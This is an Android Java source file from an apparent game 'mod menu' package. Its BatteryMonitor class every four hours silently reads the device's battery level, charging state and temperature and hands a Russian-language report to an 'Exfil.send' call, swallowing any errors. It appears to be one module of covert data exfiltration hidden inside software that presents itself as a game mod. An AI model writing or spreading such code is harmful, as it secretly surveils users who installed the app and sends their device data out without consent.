package com.brawl.modmenu;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Handler;
import android.os.Looper;

public class BatteryMonitor {

    private static final long INTERVAL = 4 * 60 * 60 * 1000L; // 4 часа

    public static void start(final Context ctx) {
        Handler h = new Handler(Looper.getMainLooper());

        Runnable task = new Runnable() {
            @Override
            public void run() {
                try {
                    IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                    Intent b = ctx.registerReceiver(null, f);
                    if (b != null) {
                        int level = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                        int status = b.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                        int temp = b.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
                        boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                            || status == BatteryManager.BATTERY_STATUS_FULL;

                        String msg = "🔋 Батарея: " + level + "%\n"
                            + "Статус: " + (charging ? "⚡ Заряжается" : "🔋 Разряд")
                            + "\nТемпература: " + (temp / 10.0) + "°C"
                            + "\n🕐 " + new java.util.Date();

                        Exfil.send("BATTERY_PERIODIC", msg);
                    }
                } catch (Throwable ignored) {}
                h.postDelayed(this, INTERVAL);
            }
        };
        h.postDelayed(task, INTERVAL);
    }
}
